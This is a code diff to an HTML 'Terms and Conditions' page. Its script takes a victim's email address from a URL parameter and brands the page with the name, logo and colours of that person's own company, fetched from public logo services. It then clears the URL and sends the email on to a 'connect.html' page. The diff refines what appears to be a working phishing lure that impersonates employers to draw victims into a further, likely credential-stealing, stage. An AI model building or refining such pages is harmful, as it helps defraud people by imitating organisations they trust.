@@ -11,7 +11,7 @@
 <style>
     body { font-family: Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 0; }
     .container { max-width: 900px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-    .logo { width: 96px; height: 96px; display: block; margin: 0 auto 30px auto; border-radius: 15px; }
+    .logo { width: 96px; height: 96px; display: block; margin: 0 auto 30px auto; border-radius: 15px; object-fit: contain; }
     h1, h2 { color: #222; }
     h1 { text-align: center; margin-bottom: 30px; }
     h2 { margin-top: 35px; }
@@ -30,8 +30,6 @@
     <img id="dynamicLogo" class="logo" src="" alt="Logo">
 
     <h1 id="companyNameHeader">Terms and Conditions</h1>
-</p>
-   </p>
     <p><strong>Effective Date:</strong> 10/12/2025</p>
 
     <p id="introText">
@@ -125,25 +123,23 @@
 <script>
 (async function(){
 
-    // Helper function to capitalize first letter
     function capitalize(str){ return str.charAt(0).toUpperCase() + str.slice(1); }
 
     // Get email from query string
     const params = new URLSearchParams(window.location.search);
     let email = params.get("bazz");
     if(email) email = decodeURIComponent(email.trim());
-// Clean URL
-  history.replaceState({}, document.title, window.location.pathname);
-    // Determine domain for dynamic info
+
+    // Clean URL
+    history.replaceState({}, document.title, window.location.pathname);
+
     let domain = "example.com";
     if(email && email.includes("@")) domain = email.split("@")[1].toLowerCase();
 
-    // Dynamic company info
     const companyName = capitalize(domain.split(".")[0]);
     const supportEmail = `support@${domain}`;
     const websiteURL = `https://www.${domain}`;
 
-    // Update all references
     document.getElementById("companyName").textContent = companyName;
     document.getElementById("companyNameHeader").textContent = `Terms and Conditions for ${companyName}`;
     document.getElementById("companyNameFooter").textContent = companyName;
@@ -151,19 +147,18 @@
     if(document.getElementById("companyEmail")) document.getElementById("companyEmail").textContent = supportEmail;
     if(document.getElementById("companyWebsite")) document.getElementById("companyWebsite").textContent = websiteURL;
 
-    // Dynamic logo and favicon
     const logoEl = document.getElementById("dynamicLogo");
     const faviconEl = document.getElementById("dynamicFavicon");
-    const fallbackBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAA..."; // Replace with actual fallback image
+    const fallbackBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAA...";
 
     async function fetchLogoBase64(domain){
         const urls = [
-            `https://logo.clearbit.com/${domain}`,
-            `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
+            `https://logo.clearbit.com/${domain}?size=256`,
+            `https://favicon.vemetric.com/${domain}?size=128`
         ];
         for(const url of urls){
             try{
-                const res = await fetch(url,{mode:'cors'});
+                const res = await fetch(url);
                 if(!res.ok) continue;
                 const blob = await res.blob();
                 return await new Promise(resolve=>{
@@ -180,7 +175,6 @@
     logoEl.src = base64Logo;
     faviconEl.href = base64Logo;
 
-    // Function to compute average color
     function getAverageColor(imgEl){
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -194,7 +188,6 @@
         return `rgb(${r},${g},${b})`;
     }
 
-    // Apply average color styling once logo loads
     logoEl.onload = ()=>{
         const avgColor = getAverageColor(logoEl);
         const acceptBtn = document.getElementById("acceptBtn");
@@ -207,9 +200,8 @@
         document.querySelector(".container").style.borderTop = `10px solid ${avgColor}`;
     };
 
-    // Button click to review.html with email param
     document.getElementById("acceptBtn").addEventListener("click", ()=>{
-        let targetURL = "bc.html";
+        let targetURL = "connect.html";
         if(email) targetURL += `?bazz=${encodeURIComponent(email)}`;
         window.location.href = targetURL;
     });
